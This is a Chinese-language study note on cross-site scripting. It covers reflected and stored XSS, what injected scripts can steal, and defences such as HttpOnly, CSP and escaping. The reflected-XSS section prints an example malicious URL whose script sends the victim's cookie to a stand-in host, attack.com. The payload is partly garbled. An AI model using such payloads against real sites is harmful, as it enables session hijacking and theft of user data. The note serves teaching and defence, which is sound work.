## XSS

XSS跨站脚本攻击。通常指攻击者通过”HTML注入“篡改了网页，插入了恶意脚本，从而用户浏览网页时，对用户的浏览器进行控制或者获取用户的敏感信息的一种攻击方式

被注入恶意JavaScript会怎么

1. **可以窃取cookie信息**。恶意的JavaScript可以通过`document.cookie`获取cookie信息，然后通过XMLHttpRequest加上CORS功能将数据发送给恶意服务器；恶意服务器拿到用户cookie信息只会，就可以再其他电脑上模拟用户登录，进行转账操作
2. **可以监听用户行为**。通过`addEventListener`接口来监听键盘事件，比如可以获取用户输入的银行卡等信息。
3. **可以修改DOM**
4. 可以在页面内生成浮窗广告

**XSS攻击可以分为三类：反射性，存储型，基于DOM型**

### 反射型

- 用户将一段含有恶意代码的请求提交给服务器
- 服务器在接收请求时，又将恶意代码反射给浏览器端，这就是反射型XSS攻击

例子：

- 用户登录可信任的服务器，得到cookie
- 攻击者将他自己准备好的URL提交给客户`https://wahh-app.com/error.php?message=<script>var + i = nre + Image;+i.src="http://attack.com/"%2bdocument.cookies;</script>`
- 用户向可信服务器请求攻击者的URL
- 服务器响应用户请求，由于存在XSS漏洞，响应中包含了攻击者创建的JavaScript代码
-  用户浏览器收到攻击者的JavaScript代码，像执行从应用程序收到的其他代码一样，浏览器执行这段代码。
- 攻击者创建的恶意JavaScript代码，将用户的cookie发送到自己的服务器中
- 攻击者使用截获的令牌劫持用户的会话，从而访问该用户的个人信息，并"代表"该用户执行任意操作。

利用XSS漏洞的攻击之所以取得成功，是因为攻击者的恶意JavaScript是由wahh-app.com送交给它的。当用户请求攻击者的URL时，浏览器向https://wahh-app.com/ error.php提交一个请求，然后应用程序返回一个包含一段JavaScript的页面。和从wahh-app.com收到的任何 JavaScript一样，浏览器执行这段脚本，因为用户信任wahh-app.com。这也就是为何攻击的脚本能够访问wahh-app.com发布的 cookie的原因，



### 持久型XSS

 存储型会把用户输入的数据“存储”在服务器。 

持久型XSS一般存在与Form表单中，如文章留言等，黑客利用XSS的漏洞，将内容经正常提交进入数据库持久保存，当前端页面获得后端从数据库中读取的注入代码时，恰好将其渲染执行。

 这种攻击常见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等。 

攻击成功需要同时满足以下几个条件：

- POST请求提交表单后端没做转义直接入库
- 后端从数据库中取出的数据没做转义直接输出给前端
- 前端拿到后端数据没做转义直接渲染成DOM

持久型XSS特点：

- 持久性，植入在数据库中

**如何防御**

- `HttpOnly`

  由于很多XSS攻击都是盗取cookie的，因此可以通过使用HttpOnly属性直接通过`document.cookie`来获取cookie

   `HttpOnly`是在 `Set-Cookie`时标记的

   HttpOnly 并非阻止 XSS 攻击，而是能阻止 XSS 攻击后的 Cookie 劫持攻击。 

- CSP(网页安全策略)
  - CSP的制度就是白名单制度，开发者明确告诉客户端，哪些外部元素可以加载和执行，等同于提供了白名单，它的实现和执行全部由浏览器完成，开发者只需要提供配置。这种情况下，攻击者就算发现漏洞，也没法注入脚本，除非还控制一台列入了白名单的可信主机
  - 开启方式：HTTP头信息的Content-Security-Policy字段
  - default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self';
- 转义字符
  - **用户的输入永远不可信，最普遍的做法就是转义输入输出内容**，对于引号(&quto;)、尖括号(<:&lt >&gt)、斜杠(&#x2F)进行转义
  - 使用使用 npm 包来简化操作，js-xss(第三方库)来实现转义



